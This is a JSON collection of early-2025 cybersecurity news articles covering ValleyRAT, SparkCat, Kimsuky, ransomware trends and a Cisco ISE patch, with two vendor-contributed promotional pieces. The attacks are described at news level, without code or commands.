[
    {
        "Title": "Fake Google Chrome Sites Distribute ValleyRAT Malware via DLL Hijacking",
        "Link": "https://thehackernews.com/2025/02/fake-google-chrome-sites-distribute.html",
        "Summary": "Bogus websites advertising Google Chrome have been used to distribute malicious installers for a remote access trojan called ValleyRAT.\nThe malware, first detected in 2023, is attributed to a threat actor tracked as Silver Fox, with prior attack campaigns primarily targeting Chinese-speaking regions like Hong Kong, Taiwan, and Mainland China.\n\"This actor has increasingly targeted key roles",
        "Date": "2025-02-06",
        "Content": "Bogus websites advertising Google Chrome have been used to distribute malicious installers for a remote access trojan called ValleyRAT.\nThe malware, first detected in 2023, is attributed to a threat actor tracked as Silver Fox, with prior attack campaigns primarily targeting Chinese-speaking regions like Hong Kong, Taiwan, and Mainland China.\n\"This actor has increasingly targeted key roles within organizations—particularly in finance, accounting, and sales department — highlighting a strategic focus on high-value positions with access to sensitive data and systems,\" Morphisec researcher Shmuel Uzan\nsaid\nin a report published earlier this week.\nEarly\nattack chains\nhave been observed delivering ValleyRAT alongside other malware families such as Purple Fox and Gh0st RAT, the latter of which has been\nextensively\nused\nby various\nChinese hacking groups\n.\nAs recently as last month, counterfeit installers for legitimate software have served as a distribution mechanism for the trojan by means of a DLL loader named PNGPlug.\nIt's worth noting that a drive-by download scheme targeting Chinese-speaking Windows users was\npreviously used\nto deploy Gh0st RAT using malicious installer packages for the Chrome web browser.\nIn a similar fashion, the latest attack sequence associated with ValleyRAT entails the use of a fake Google Chrome website to trick targets into downloading a ZIP archive containing an executable (\"Setup.exe\").\nMorphisec CTO Michael Gorelik told The Hacker News that there is evidence connecting the two activity clusters, and that the deceptive Chrome installer site was previously leveraged to download the Gh0st RAT payload.\n\"This campaign specifically targeted Chinese-speaking users, as indicated by the use of Chinese-language web lures and applications aimed at data theft and evasion of defenses by the malware,\" Gorelik said.\n\"The links to the fake Chrome sites are primarily distributed through drive-by download schemes. Users searching for the Chrome browser are directed to these malicious sites, where they inadvertently download the fake installer. This method exploits the users' trust in legitimate software downloads, making them susceptible to infection.\"\nThe setup binary, upon execution, checks if it has administrator privileges and then proceeds to download four additional payloads, including a legitimate executable associated with Douyin (\"Douyin.exe\"), the Chinese version of TikTok, that's used to sideload a rogue DLL (\"tier0.dll\"), which then launches the ValleyRAT malware.\nAlso retrieved is another DLL file (\"sscronet.dll\"), which is responsible for terminating any running process present in an exclusion list.\nCompiled in Chinese and written in C++, ValleyRAT is a trojan that's designed to monitor screen content, log keystrokes, and establish persistence on the host. It's also capable of initiating communications with a remote server to await further instructions that allow it to enumerate processes, as well as download and execute arbitrary DLLs and binaries, among others.\n\"For payload injection, the attacker abused legitimate signed executables that were vulnerable to DLL search order hijacking,\" Uzan said.\nThe development comes as Sophos\nshared details\nof phishing attacks that employ Scalable Vector Graphics (\nSVG\n) attachments to evade detection and deliver an AutoIt-based keystroke logger malware like Nymeria or direct users to credential harvesting pages.\n(The story was updated after publication to include additional insights from Morphisec.)\nFound this article interesting?  Follow us on\nTwitter\n\nand\nLinkedIn\nto read more exclusive content we post."
    },
    {
        "Title": "Ransomware Extortion Drops to $813.5M in 2024, Down from $1.25B in 2023",
        "Link": "https://thehackernews.com/2025/02/ransomware-extortion-drops-to-8135m-in.html",
        "Summary": "Ransomware attacks netted cybercrime groups a total of $813.5 million in 2024, a decline from $1.25 billion in 2023.\nThe total amount extorted during the first half of 2024 stood at $459.8 million, blockchain intelligence firm Chainalysis said, adding payment activity slumped after July 2024 by about 3.94%.\n\"The number of ransomware events increased into H2, but on-chain payments declined,",
        "Date": "2025-02-06",
        "Content": "Ransomware attacks netted cybercrime groups a total of $813.5 million in 2024, a decline from $1.25 billion in 2023.\nThe total amount extorted during the first half of 2024 stood at $459.8 million, blockchain intelligence firm Chainalysis said, adding payment activity slumped after July 2024 by about 3.94%.\n\"The number of ransomware events increased into H2, but on-chain payments declined, suggesting that more victims were targeted, but fewer paid,\" the company\nsaid\n.\nAdding to the challenges is an increasingly fragmented ransomware ecosystem, which, in the wake of the collapse of LockBit and BlackCat, has led to the emergence of a lot of newcomers that have eschewed big game hunting in favor of small- to mid-size entities that, in turn, translate to more modest ransom demands.\nAccording to data compiled by Coveware, the\naverage ransomware payment\nin Q4 2024 was at $553,959, up from\n$479,237 in Q3\n. The median ransomware payment, in contrast, dropped from $200,000 to $110,890 quarter-over-quarter, a 45% drop.\n\"Payments continue to remain primarily a last-resort option for those who have no alternative to recover critical data,\" the company said.\n\"Faulty decryption tools from both new and old ransomware strains and mounting distrust of threat actors' ability to honor assurances compound to drive victims away from the table unless they have no other option.\"\nThe decline in ransom payments have also been complemented by growing law enforcement success in dismantling cybercriminal networks and crypto laundering services, thereby disrupting the financial incentive and raising the barriers to entry.\nThat said, 2024 also witnessed the highest volume of annual ransomware cases since 2021, reaching a staggering 5,263 attacks, an increase of 15% year-over-year.\n\"With a crucial role in the global economy, Industrials experienced 27% (1424) of all ransomware attacks in 2024, increasing 15% from 2023,\" NCC Group\nsaid\n. \"North America experienced over half of all attacks in 2024 (55%).\"\nThe most commonly observed ransomware variants during 2024 were Akira (11%), Fog (11%), RansomHub (8%), Medusa (5%), BlackSuit (5%), BianLian (4%), and Black Basta (4%). Lone wolf actors captured an 8% market share during the time period.\nSome of the new entrants observed in recent months include\nArcus Media\n,\nCloak\n,\nHellCat\n,\nNnice\n,\nNotLockBit\n,\nWantToCry\n, and\nWindows Locker\n. HellCat, in particular, has been found resorting to psychological tactics to humiliate victims and pressure them into paying up.\n\"Both Akira and Fog have used identical money laundering methods, which are distinct from other ransomware strains, further supporting a connection between them,\" Chainalysis said.\n\"Both groups have primarily focused on exploiting VPN vulnerabilities, which allows them to gain unauthorized access to networks and consequently deploy their ransomware.\"\nFound this article interesting?  Follow us on\nTwitter\n\nand\nLinkedIn\nto read more exclusive content we post."
    },
    {
        "Title": "SparkCat Malware Uses OCR to Extract Crypto Wallet Recovery Phrases from Images",
        "Link": "https://thehackernews.com/2025/02/sparkcat-malware-uses-ocr-to-extract.html",
        "Summary": "A new malware campaign dubbed SparkCat has leveraged a suit of bogus apps on both Apple's and Google's respective app stores to steal victims' mnemonic phrases associated with cryptocurrency wallets.&nbsp;\nThe attacks leverage an optical character recognition (OCR) model to exfiltrate select images containing wallet recovery phrases from photo libraries to a command-and-control (C2) server,",
        "Date": "2025-02-06",
        "Content": "A new malware campaign dubbed SparkCat has leveraged a suit of bogus apps on both Apple's and Google's respective app stores to steal victims' mnemonic phrases associated with cryptocurrency wallets.\nThe attacks leverage an optical character recognition (OCR) model to exfiltrate select images containing wallet recovery phrases from photo libraries to a command-and-control (C2) server, Kaspersky researchers Dmitry Kalinin and Sergey Puzan\nsaid\nin a technical report.\nThe moniker is a reference to an embedded software development kit (SDK) that employs a Java component called Spark that masquerades as an analytics module. It's currently not known whether the infection was a result of a supply chain attack or if it was intentionally introduced by the developers.\nWhile this is\nnot\nthe\nfirst time\nAndroid malware with OCR capabilities has been detected in the wild, it's one of the first instances where such a stealer has been found in Apple's App Store. The infected apps in Google Play are said to have been downloaded over 242,000 times.\nThe campaign is assessed to have been active since March 2024, with the apps distributed via both official and unofficial app stores. The applications masquerade as artificial intelligence (AI), food delivery, and Web3 apps, although some of them appear to offer legitimate functionality.\n\"The Android malware module would decrypt and launch an OCR plug-in built with Google's\nML Kit library\n, and use that to recognize text it found in images inside the gallery,\" Kaspersky said. \"Images that matched keywords received from the C2 were sent to the server.\"\nIn a similar vein, the iOS version of SparkCat relies on Google's ML Kit library for OCR to steal images containing mnemonic phrases. A notable aspect of the malware is its use of a Rust-based communication mechanism for C2, something rarely observed in mobile apps.\nFurther analysis of keywords used and the regions where these apps were made available indicate that the campaign is primarily targeting users in Europe and Asia. It's assessed that the malicious activity is the work of a threat actor who is fluent in Chinese.\n\"What makes this Trojan particularly dangerous is that there's no indication of a malicious implant hidden within the app,\" the researchers said. \"The permissions that it requests may look like they are needed for its core functionality or appear harmless at first glance.\"\nThe disclosure comes as Zimperium zLabs detailed another mobile malware campaign targeting Indian Android device owners by distributing malicious APK files via WhatsApp under the guise of banking and government applications, allowing the apps to harvest sensitive perusal and financial information.\nThe cybersecurity company said it has identified over 1,000 phony apps linked to the campaign, with the attackers leveraging roughly 1,000 hard-coded phone numbers as exfiltration points for SMS messages and one-time passwords (OTPs).\n\"Unlike conventional banking Trojans that rely solely on command-and-control (C&C) servers for one-time password (OTP) theft, this malware campaign leverages live phone numbers to redirect SMS messages, leaving a traceable digital trail for law enforcement agencies to track the threat actors behind this campaign,\" security researcher Aazim Yaswant\nsaid\n.\nThe attack campaign, named FatBoyPanel, is said to have amassed 2.5 GB of sensitive data to date, all of which is hosted on Firebase endpoints that are accessible to anyone sans authentication.\nThis includes SMS messages from Indian banks, bank details, credit and debit card information, and government-issued identification details belonging to about 50,000 users, a majority of whom are located in the Indian states of West Bengal, Bihar, Jharkhand, Karnataka, and Madhya Pradesh.\nThese incidents tell a cautionary tale of the importance of properly vetting code apps, including scrutinizing reviews and checking the authenticity of the developers, before downloading them, even if they are uploaded to official app storefronts.\nThe development also follows the emergence of\n24 new malware families\ntargeting Apple macOS systems in 2024,\nup from 21 in 2023\n, according to security researcher Patrick Wardle.\nThis coincides with a surge in information stealer attacks, such as those involving\nPoseidon\n,\nAtomic\n, and\nCthulhu\n, that are specifically aimed at the users of the desktop operating system.\n\"Infostealers leveraging macOS often exploit the native\nAppleScript\nframework,\" Palo Alto Networks Unit 42 researchers Tom Fakterman, Chen Erlich, and Tom Sharon\nsaid\nin a report published this week.\n\"This framework provides extensive OS access, and it also simplifies execution with its natural language syntax. Since these prompts can look like legitimate system prompts, threat actors use this framework to trick victims via social engineering.\"\nUpdate\nThe offending apps have been removed from both Apple App Store and Google Play as of February 7, 2025. Google also told The Hacker News that \"Android users are automatically protected from known versions of this malware with Google Play Protect, which is on by default on Android devices with Google Play Services.\"\n(The story was updated after publication to include a response from Google, and that the apps in question are no longer accessible.)\nFound this article interesting?  Follow us on\nTwitter\n\nand\nLinkedIn\nto read more exclusive content we post."
    },
    {
        "Title": "The Evolving Role of PAM in Cybersecurity Leadership Agendas for 2025",
        "Link": "https://thehackernews.com/2025/02/the-evolving-role-of-pam-in.html",
        "Summary": "Privileged Access Management (PAM) has emerged as a cornerstone of modern cybersecurity strategies, shifting from a technical necessity to a critical pillar in leadership agendas. With the PAM market projected to reach $42.96 billion by 2037 (according to Research Nester), organizations invest heavily in PAM solutions.\n\nWhy is PAM climbing the ranks of leadership priorities? While Gartner",
        "Date": "2025-02-06",
        "Content": "Privileged Access Management (PAM) has emerged as a cornerstone of modern cybersecurity strategies, shifting from a technical necessity to a critical pillar in leadership agendas. With the PAM market projected to reach $42.96 billion by 2037 (according to Research Nester), organizations invest heavily in PAM solutions.\nWhy is PAM climbing the ranks of leadership priorities? While Gartner highlights key reasons such as enhanced security, regulatory compliance readiness, and insurance requirements, the impact of PAM extends across multiple strategic areas. PAM can help organizations enhance their overall operational efficiency and tackle many challenges they face today.\nTo explore more about PAM's transformative impact on businesses, read\nThe Cyber Guardian: PAM's Role in Shaping Leadership Agendas for 2025\nby a renowned cybersecurity expert and former Gartner lead analyst Jonathan Care.\nWhat cybersecurity challenges may organizations face in 2025?\nThe cybersecurity landscape is predicted to be highly dynamic in 2025, marked by evolving attack techniques, new vulnerabilities, and an expanding attack surface. The most acute trends include:\nInsider threats\nOrganizations often focus on external threats, while overlooking risks from within. Insider threats are one of the most underestimated yet impactful cybersecurity risks. Insider risks may manifest in several forms:\nmalicious actors may intentionally harm your organization\nnegligent employees might carelessly exfiltrate your sensitive data\nexternal attackers can compromise your employees' credentials to gain unauthorized access to your systems.\nThe scope of insider threats becomes even clearer when checking the recent statistics. According to Verizon's 2024 Data Breach Investigations Report, 31% of all data breaches over the past decade have involved stolen credentials. In the last year alone, 68% of all breaches included a human element, with people being involved either via error, privilege misuse, use of stolen credentials, or social engineering.\nThird-party vulnerabilities\nReliance on third-party vendors, contractors, and suppliers introduces significant security risks. Threats stemming from inadequate vendor security, software supply chain attacks, and subcontractor vulnerabilities continue to grow more prominent.\nHigh-profile incidents, such as the\nChange Healthcare data breach,\nin which 190 million records were compromised due to weak third-party access controls, underscore the need for robust PAM solutions.\nSophisticated cyberattacks\nWith the evolution of AI and ML, cyberattacks are becoming increasingly targeted and sophisticated. AI enables malicious actors to create more convincing phishing schemes, whereas ML helps them make brute-force attacks more efficient.\nAdvanced persistent threats represent a particularly insidious class of cyberattacks. These prolonged, targeted attacks are often performed by nation-states or organized crime groups aiming to steal sensitive information or disrupt operations.\nThe 2024\nSalt Typhoon cyber espionage attack\non the U.S. telecommunications networks is a prime example. It highlights the persistent threat posed by state-sponsored cyber actors and highlights vulnerabilities within critical communication infrastructures that need urgent attention and remediation.\nHybrid environments\nAs organizations continue to adopt hybrid work models, managing privileged access across dispersed teams, multiple locations and numerous devices becomes increasingly complex. Hybrid environments make it harder to monitor and enforce consistent access controls.\nEmployees and contractors may also access corporate systems from unsecured devices and networks, creating gaps in security policies and increasing the risk of credential theft and unauthorized access.\nIn recent years, many companies tend to switch between on-premises and cloud environments. While offering scalability and efficiency, hybrid environments are more susceptible to misconfigurations, providing more entry points for cybercriminals to exploit.\nCompliance pressures\nRegulatory compliance remains one of the major challenges for organizations in 2025, as governments and industry bodies continue to introduce stricter data protection and cybersecurity regulations.\nDepending on the industry or region, organizations may be subjected to the GDPR, HIPAA, PCI DSS, SOX, DORA, NIS2, and others. These cybersecurity standards, laws, and regulations mandate robust access controls, data protection measures, incident response capabilities, and thorough auditing activities.\nNon-compliance can result in significant financial, legal, and reputational consequences.\nHow can PAM help cybersecurity leaders overcome these challenges?\nPAM solutions play a pivotal role in addressing these challenges by allowing organizations to control and monitor access to critical systems and sensitive data. PAM solutions like\nSyteca\nempower organizations to:\nEnforce the principle of least privilege\n. Limit user access to only those resources necessary for their job duties.\nCentralize access control\n. Manage privileged accounts across on-prem, cloud, and hybrid environments.\nImplement multi-factor authentication (MFA)\n. Verify the identities of all users accessing your IT infrastructure.\nGrant just-in-time (JIT) access\n. Provide temporary access to your critical systems, thus, minimizing exposure to persistent threats.\nAutomate account discovery.\nDetect and secure unmanaged privileged accounts within your systems.\nSecure credentials with vaulting and rotation\n. Prevent credential theft by encrypting and systematically rotating passwords.\nPrevent lateral movement attacks\n. Stop cybercriminals from escalating privileges and moving across your networks undetected.\nManage privileged user sessions.\nTrack and analyze user sessions to detect and stop unusual activity.\nStreamline audits\n. Provide comprehensive activity logs and reports for security audits.\nA robust PAM solution ensures that only the right people, at the right time, with the right level of access, can interact with your critical systems — helping you stay resilient and compliant.\nBeyond access control: How modern PAM enhances cybersecurity ecosystems\nMany modern PAM solutions go beyond traditional access control by integrating with broader cybersecurity ecosystems. Organizations can use PAM solutions along with Security Information and Event Management (SIEM) systems, User Activity Monitoring (UAM) platforms, and IT ticketing systems for a more holistic approach to cybersecurity.\nPAM + ticketing systems: Enhanced access control\nUsing PAM in conjunction with ticketing systems helps organizations enforce strict access validation. Before granting privileged access, the system verifies the presence of a corresponding ticket. If the ticket is valid, access is granted. Thus, PAM's integration with ticketing systems enhances accountability and security by ensuring that access is only granted for authorized, documented requests.\nPAM + SIEM: Advanced threat detection\nIntegrating PAM with SIEM systems allows you to correlate privileged access activities with broader security events. SIEM systems analyze privileged access logs to detect unusual patterns, such as unauthorized access attempts or privilege escalation. If a privileged session triggers a security event, SIEM can automatically alert IT teams.\nPAM + UAM: Visibility into privileged user activity\nIf you use PAM along with UAM solutions, you gain deeper insights into how privileged users interact with your critical assets. Security teams can monitor on-screen privileged user activity, application/web usage, keystrokes, and file transfer operations to detect unusual or risky behavior. When a security event occurs, teams can replay privileged sessions to understand exactly what happened.\nWith\nSyteca\n, you don't need two separate solutions. It's a comprehensive cybersecurity platform that enables you to leverage both PAM and UAM functionalities for robust access management, user activity monitoring, real-time alerts, and proactive incident response.\nNote: Syteca also integrates with SIEMs, ticketing systems, and SSO software, allowing you to build a cybersecurity ecosystem tailored to your specific needs.\nPAM's strategic benefits for organizations\nIn addition to helping companies tackle cybersecurity challenges and meet IT compliance requirements, PAM solutions offer some other strategic benefits.\nEnhanced operational efficiency\nPAM automates routine and time-consuming tasks such as password rotations, access approvals, and privileged session monitoring. This reduces the workload on IT teams, allowing them to focus on higher-value initiatives and strategic projects. Streamlined operations ensure that employees and partners can access critical resources without interruptions, fostering a more productive work environment.\nCost savings and increased ROI\nPAM drives higher return on investment (ROI) by preventing costly breaches, minimizing downtime, and automating access management processes. For instance, organizations leveraging PAM often see measurable reductions in the time and resources required to manage privileged accounts.\nReduced insurance premiums\nImplementation of PAM solutions demonstrates robust security measures to cyber insurance providers, helping businesses reduce premiums. Insurers evaluate the effectiveness of an organization's risk management systems, including access controls, when determining premiums.\nPAM as a priority for cybersecurity leaders\nAs cybersecurity threats evolve, the importance of PAM continues to grow. By addressing pressing challenges such as insider threats, strict regulatory compliance, new types of cyberattacks, and the complexities of hybrid IT environments, PAM ensures that organizations remain resilient in the face of dynamic risks.\nSyteca PAM\nempowers organizational leaders to foster security and operational efficiency. With features to combat today's challenges and meet tomorrow's needs, Syteca offers a holistic approach to protecting critical assets and streamlining access management.\nBook a\nfree demo\nto take the next step toward a secure, future-ready IT environment.\nAbout the author:\nAni Khachatryan, Syteca's Chief Technology Officer, started her journey in Syteca as a test manager. In this role, she successfully renovated the testing processes and helped integrate development best practices across the company. Her strong background in testing and striving for perfection helps Ani come up with unconventional solutions to technical and operational issues, while her deep expertise in cybersecurity establishes her as an expert in the industry.\nFound this article interesting?\nThis article is a contributed piece from one of our valued partners.\nFollow us on\nTwitter\n\nand\nLinkedIn\nto read more exclusive content we post."
    },
    {
        "Title": "North Korean APT Kimsuky Uses forceCopy Malware to Steal Browser-Stored Credentials",
        "Link": "https://thehackernews.com/2025/02/north-korean-apt-kimsuky-uses-lnk-files.html",
        "Summary": "The North Korea-linked nation-state hacking group known as Kimsuky has been observed conducting spear-phishing attacks to deliver an information stealer malware named forceCopy, according to new findings from the AhnLab Security Intelligence Center (ASEC).\nThe attacks commence with phishing emails containing a Windows shortcut (LNK) file that's disguised as a Microsoft Office or PDF document.",
        "Date": "2025-02-06",
        "Content": "The North Korea-linked nation-state hacking group known as Kimsuky has been observed conducting spear-phishing attacks to deliver an information stealer malware named forceCopy, according to\nnew findings\nfrom the AhnLab Security Intelligence Center (ASEC).\nThe attacks commence with phishing emails containing a Windows shortcut (LNK) file that's disguised as a Microsoft Office or PDF document.\nOpening this attachment triggers the execution of PowerShell or mshta.exe, a legitimate Microsoft binary designed to run HTML Application (HTA) files, that are responsible for downloading and running next-stage payloads from an external source.\nThe South Korean cybersecurity company said the attacks culminated in the deployment of a known trojan dubbed\nPEBBLEDASH\nand a custom version of an open-source Remote Desktop utility named\nRDP Wrapper\n.\nAlso delivered as part of the attacks is a proxy malware that allows the threat actors to establish persistent communications with an external network via RDP.\nFurthermore, Kimsuky has been observed using a PowerShell-based keylogger to record keystrokes and a new stealer malware codenamed forceCopy that's used to copy files stored in web browser-related directories.\n\"All of the paths where the malware is installed are web browser installation paths,\" ASEC said. \"It is assumed that the threat actor is attempting to bypass restrictions in a specific environment and steal the configuration files of the web browsers where credentials are stored.\"\nThe use of tools RDP Wrapper and proxies to commandeer infected hosts points to a tactical shift for Kimsuky, which has historically leveraged bespoke backdoors for this purpose.\nThe threat actor, also referred to as APT43, Black Banshee, Emerald Sleet, Sparkling Pisces, Springtail, TA427, and Velvet Chollima, is assessed to be affiliated with the Reconnaissance General Bureau (RGB), North Korea's primary foreign intelligence service.\nActive since at least 2012, Kimusky has a\ntrack record\nof orchestrating tailored social engineering attacks that are capable of bypassing email security protections. In December 2024, cybersecurity company Genians\nrevealed\nthat the hacking crew has been sending phishing messages that originate from Russian services to conduct credential theft.\nFound this article interesting?  Follow us on\nTwitter\n\nand\nLinkedIn\nto read more exclusive content we post."
    },
    {
        "Title": "Top 3 Ransomware Threats Active in 2025",
        "Link": "https://thehackernews.com/2025/02/top-3-ransomware-threats-active-in-2025.html",
        "Summary": "You arrive at the office, power up your system, and panic sets in. Every file is locked, and every system is frozen. A ransom demand flashes on your screen: \"Pay $2 million in Bitcoin within 48 hours or lose everything.\"\nAnd the worst part is that even after paying, there’s no guarantee you’ll get your data back. Many victims hand over the money, only to receive nothing in return, or worse, get",
        "Date": "2025-02-06",
        "Content": "You arrive at the office, power up your system, and panic sets in. Every file is locked, and every system is frozen. A ransom demand flashes on your screen: \"Pay $2 million in Bitcoin within 48 hours or lose everything.\"\nAnd the worst part is that even after paying, there's no guarantee you'll get your data back. Many victims hand over the money, only to receive nothing in return, or worse, get hit again.\nThis isn't a rare case. Ransomware attacks are\ncrippling businesses\nworldwide, from hospitals and banks to small companies. The only way to stop the damage is by proactively analyzing suspicious files and links before they can be executed.\nBelow, we break down the top three ransomware families active in 2025: LockBit, Lynx, and Virlock, and find out how interactive analysis helps businesses detect and stop them before it's too late.\nLockBit: Teasing a Comeback in 2025\nLockBit is one of the most notorious ransomware groups, known for its highly efficient encryption, double extortion tactics, and ability to evade traditional security measures. Operating under a Ransomware-as-a-Service (RaaS)model, it enables affiliates to distribute the malware, leading to widespread attacks across various industries.\nLatest attacks and activity:\nLondon Drugs (May 2024):\nLockBit targeted Canadian retailer London Drugs, forcing the closure of all its locations across Canada. Hackers demanded $25 million, leaking some employee data after the company refused to pay.\nUniversity Hospital Center, Zagreb (June 2024):\nDisrupted Croatia's largest hospital, forcing staff to revert to manual operations while attackers claimed to have exfiltrated medical records.\nEvolve Bank & Trust (June 2024):\nBreached sensitive financial data, with hackers falsely claiming to have Federal Reserve information. The attack raised concerns due to Evolve's ties with major fintech firms.\nLockBit sample:\nLet's take a closer look at a LockBit ransomware sample inside ANY.RUN's secure sandbox to discover its key behaviors.\nView analysis session\nFile icons changed inside ANY.RUN sandbox\nInside the Interactive Sandbox, we notice the first thing that stands out: file icons changing to the LockBit logo. This is an immediate sign of ransomware infection.\nUncover ransomware tactics in real-time and prevent costly breaches before they happen.\nTry ANY.RUN free for 14 days\nThis is followed by a ransom note inside the sandbox, stating that your files have been stolen and encrypted. The message is clear: Pay the ransom, or the data will be published on a TOR website.\nRansom note displayed inside secure environment\nOn the right side of the screen, we see a detailed breakdown of every process LockBit executes to attack the system.\nProcess tree demonstrates the behaviors of LockBit\nBy clicking on any process, security teams can analyze the exact tactics used in the attack.\nDetailed breakdown of processes inside Interactive Sandbox\nThis type of analysis is important for businesses as it allows them to understand how ransomware spreads, identify weak points in their security, and take proactive steps to block similar threats before they cause financial and operational damage.\nFor a more in-depth breakdown of the attack tactics, you can also click on the ATT&CK button in the upper-right corner of the sandbox. This provides detailed insights into each tactic, helping teams fine-tune their defenses and strengthen response strategies.\nMITRE ATT&CK tactics and techniques detected by ANY.RUN\nIn this case, we see LockBit using several dangerous techniques:\nGaining higher privileges by bypassing security controls.\nExtracting stored credentials from files and web browsers.\nScanning the system to gather information before encrypting files.\nEncrypting data to lock down critical business operations.\nNew attack warning in 2025:\nDespite law enforcement actions, LockBit continues to pose a significant threat for 2025. The group's alleged leader, known as LockBitSupp, has warned of new ransomware attacks launching this February. This means businesses cannot afford to let their guard down.\nLynx: The Rising Threat to Small and Mid-Sized Businesses\nLynx is a relatively new ransomware group that surfaced in mid-2024 and quickly built a reputation for its highly aggressive approach. Unlike larger ransomware gangs that focus on corporate giants, Lynx deliberately goes after small and mid-sized businesses across North America and Europe, taking advantage of weaker security measures.\nTheir strategy relies on double extortion. They don't just encrypt files but also threaten to leak stolen data on both public websites and dark web forums if victims refuse to pay. This forces businesses into an impossible choice: pay the ransom or risk having confidential data, financial details, and customer records exposed online.\nLatest Lynx attack:\nIn mid-January 2025,\nLynx\ntargeted Lowe Engineers, a prominent civil engineering firm based in Atlanta, Georgia. The attack led to the exfiltration of sensitive data, including confidential project information and client details. Given the firm's involvement in critical infrastructure projects, this breach raised significant concerns about potential impacts on federal and municipal contracts.\nLynx sample:\nThanks to ANY.RUN's Interactive Sandbox, we can analyze the full attack chain of Lynx ransomware in a controlled virtual environment, without risking real systems.\nView sandbox analysis of Lynx\nThe moment we upload and launch the malicious executable file in ANY.RUN's cloud-based sandbox, the ransomware immediately starts encrypting files and changes their extensions to .LYNX.\nThe Files Modification tab provides the changes of file system activity\nShortly after, a ransom note appears, and the desktop wallpaper is replaced with an extortion message directing victims to a TOR site, where attackers demand payment.\nLynx ransomware changing the wallpaper inside ANY.RUN sandbox\nInside the ANY.RUN sandbox, we can manually open the README.txt dropped by Lynx to view the ransom message exactly as a victim would.\nThe ransom note includes .onion links that direct victims to the attackers' communication portal\nIn the MITRE ATT&CK section, we get a clear breakdown of Lynx's tactics and techniques, revealing how it operates:\nMITRE ATT&CK tactics and techniques used by Lynx ransomware\nEncrypting files to lock critical business data.\nRenaming files to mimic other ransomware strains.\nQuerying the registry to scan for system details and security software.\nReading CPU information to assess the target environment.\nChecking software policies to determine security settings before proceeding.\nVirlock: A Self-Replicating Ransomware That Won't Die\nVirlock is a unique ransomware strain that first emerged in 2014. Unlike typical ransomware, Virlock not only encrypts files but also infects them, turning each into a polymorphic file infector. This dual capability allows it to spread rapidly, especially through cloud storage and collaboration platforms.\nRecent attacks:\nIn recent analyses, Virlock has been observed spreading stealthily via cloud storage and collaboration apps. When a user's system is infected, Virlock encrypts and infects files, which are then synced to shared cloud environments.\nCollaborators who access these shared files inadvertently execute the infected files, leading to further spread within the organization.\nVirlock sample:\nLet's analyze Virlock's behavior using a real-time sample inside ANY.RUN's sandbox.\nView sandbox analysis of Virlock\nVirlock ransomware inside VM\nJust like LockBit and Lynx, Virlock drops a ransom note upon execution. However, this time, it demands payment in Bitcoin, a common tactic among ransomware operators.\nIn this specific sample, Virlock asks for the equivalent of $250 in Bitcoin, threatening to permanently delete files if the ransom isn't paid.\nInterestingly, the ransom note doesn't just demand payment. It also includes a guide on Bitcoin, explaining what it is and how victims can acquire it for payment.\nRansom note demanding BitCoin left by Virlock\nDuring execution, ANY.RUN detects several malicious activities, revealing how Virlock operates:\nBehavior of Virlock ransomware analyzed by Interactive Sandbox\nA Virlock-specific mutex is identified, helping the malware ensure only one instance runs at a time to avoid interference.\nVirlock executes commands through batch (.bat) files, launching CMD.EXE to perform malicious actions.\nThe ransomware modifies the Windows registry using REG/REGEDIT.EXE, likely to establish persistence or disable security features.\nEach sandbox session in ANY.RUN automatically generates a detailed report that can be easily shared within a company. These reports are formatted for further analysis, helping security teams collaborate and develop effective strategies to combat ransomware threats in 2025.\nGenerated report by ANY.RUN sandbox\nRansomware in 2025: A Growing Threat You Can Stop\nRansomware is more aggressive than ever, disrupting businesses, stealing data, and demanding millions in ransom. The cost of an attack includes lost operations, damaged reputation, and stolen customer trust.\nYou can stop ransomware before it locks you out. By analyzing suspicious files in ANY.RUN's Interactive Sandbox, you get real-time insights into malware behavior, without risking your systems.\nTry ANY.RUN free for 14 days\nto proactively identify cyber threats to your business before it's too late!\nFound this article interesting?\nThis article is a contributed piece from one of our valued partners.\nFollow us on\nTwitter\n\nand\nLinkedIn\nto read more exclusive content we post."
    },
    {
        "Title": "Cisco Patches Critical ISE Vulnerabilities Enabling Root CmdExec and PrivEsc",
        "Link": "https://thehackernews.com/2025/02/cisco-patches-critical-ise.html",
        "Summary": "Cisco has released updates to address two critical security flaws Identity Services Engine (ISE) that could allow remote attackers to execute arbitrary commands and elevate privileges on susceptible devices.\nThe vulnerabilities are listed below -\n\nCVE-2025-20124 (CVSS score: 9.9) - An insecure Java deserialization vulnerability in an API of Cisco ISE that could permit an authenticated, remote",
        "Date": "2025-02-06",
        "Content": "Cisco has\nreleased\nupdates to address two critical security flaws Identity Services Engine (ISE) that could allow remote attackers to execute arbitrary commands and elevate privileges on susceptible devices.\nThe vulnerabilities are listed below -\nCVE-2025-20124\n(CVSS score: 9.9) - An insecure Java deserialization vulnerability in an API of Cisco ISE that could permit an authenticated, remote attacker to execute arbitrary commands as the root user on an affected device.\nCVE-2025-20125\n(CVSS score: 9.1) - An authorization bypass vulnerability in an API of Cisco ISE could could permit an authenticated, remote attacker with valid read-only credentials to obtain sensitive information, change node configurations, and restart the node\nAn attacker could weaponize either of the flaws by sending a crafted serialized Java object or an HTTP request to an unspecified API endpoint, leading to privilege escalation and code execution.\nCisco said the two vulnerabilities are not dependent on one another and that there are no workarounds to mitigate them. They have been addressed in the below versions -\nCisco ISE software release 3.0 (Migrate to a fixed release)\nCisco ISE software release 3.1 (Fixed in 3.1P10)\nCisco ISE software release 3.2 (Fixed in 3.2P7)\nCisco ISE software release 3.3 (Fixed in 3.3P4)\nCisco ISE software release 3.4 (Not vulnerable)\nDeloitte security researchers Dan Marin and Sebastian Radulea have been credited with discovering and reporting the vulnerabilities.\nWhile the networking equipment major said it's not aware of any malicious exploitation of the flaws, users are advised to keep their systems up-to-date for optimal protection.\nFound this article interesting?  Follow us on\nTwitter\n\nand\nLinkedIn\nto read more exclusive content we post."
    },
    {
        "Title": "Microsoft says attackers use exposed ASP.NET keys to deploy malware",
        "Link": "https://www.bleepingcomputer.com/news/security/microsoft-says-attackers-use-exposed-aspnet-keys-to-deploy-malware/",
        "Summary": "Microsoft warns that attackers are deploying malware in ViewState code injection attacks using static ASP. NET machine keys found online. [...]",
        "Date": "2025-02-06",
